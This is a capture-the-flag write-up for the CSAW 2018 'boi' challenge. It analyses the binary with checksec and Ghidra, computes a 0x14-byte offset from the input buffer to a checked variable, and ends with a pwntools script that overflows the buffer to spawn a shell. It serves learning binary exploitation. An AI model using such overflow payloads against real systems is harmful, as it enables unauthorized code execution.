# Csaw 2018 Quals Boi

{% embed url="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/csaw18_boi/boi" %}

## 1. Analysis

### 1.1 Basic

```bash
$ pwn checksec boi
[*] '/path/to/binary/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled

$ ./boi
Are you a big boiiiii??
hello # input
Fri Dec 19 03:06:14 PM +08 2025
```

a. From the `pwn checksec` command, we know the following:

* 64-bit
* Partial [RELRO](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/reverse-engineering-binary-exploitation/general-knowledge/security-features/relocation-read-only-relro)
* [Stack canary](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/reverse-engineering-binary-exploitation/general-knowledge/security-features/stack-canary) present&#x20;
* [NX](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/reverse-engineering-binary-exploitation/general-knowledge/security-features/no-execute-nx) enabled
* No [PIE](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/reverse-engineering-binary-exploitation/general-knowledge/security-features/pie)

b. After running the binary, we know that the program simply prints the line `Are you a big boiiiiii??`, and waits for an input. If the input is incorrect (speculation, to be confirmed later on), it will output the current date and time.

### 1.2 Ghidra

#### `main` function (_Decompile_ view)&#x20;

{% code title="main" %}
```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 local_38;
  undefined8 local_30;
  undefined4 local_28;
  int iStack_24;
  undefined4 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_38 = 0;
  local_30 = 0;
  local_20 = 0;
  local_28 = 0;
  iStack_24 = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&local_38,0x18);
  if (iStack_24 == -0x350c4512) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
{% endcode %}

#### Refined `main` function&#x20;

```c
undefined8 main(void)
{
  long in_FS_OFFSET;
  undefined8 input;
  undefined8 local_30;
  undefined4 local_28;
  int target;
  undefined4 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  input = 0;
  local_30 = 0;
  local_20 = 0;
  local_28 = 0;
  target = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&input,0x18);
  if (target == -0x350c4512) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

From this, we know that the program reads in `0x18` (24) bytes of data from the user into the `input` variable. Next, it checks if the `target` variable matches a certain value (`-0x350c4512`). If it matches, run `/bin/bash`, else run `/bin/date`.

#### Variables (_Listing_ view)&#x20;

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

We can see that the `input` is stored lower in the stack at offset `-0x38`, while the `target` variable is stored higher at offset `-0x24`. This makes the `input` variable `0x38` - `0x24` = `0x14` bytes lower than the `target` variable. This means that given the proper payload, we can overwrite the value of the `target` variable in the stack with the matching value.

The assembly instruction corresponding to the _IF_ statement:

```c
if (target == -0x350c4512) {
...
```

```asm
004006a8 3d ee ba        CMP        EAX,0xcaf3baee
         f3 ca

```

This means that we have to overwrite the `target` variable value in stack with `0xcaf3baee`&#x20;

### 1.3 GDB

```bash
$ gdb boi
```









```python
# Import pwntools
from pwn import *

# Establish the target process
target = process('./boi')

# Make the payload
# 0x14 bytes of filler data to fill the gap between the start of our input
# and the target int
# 0x4 byte int we will overwrite target with
payload = "0"*0x14 + p32(0xcaf3baee)

# Send the payload
target.send(payload)

# Drop to an interactive shell so we can interact with our shell
target.interactive()

```





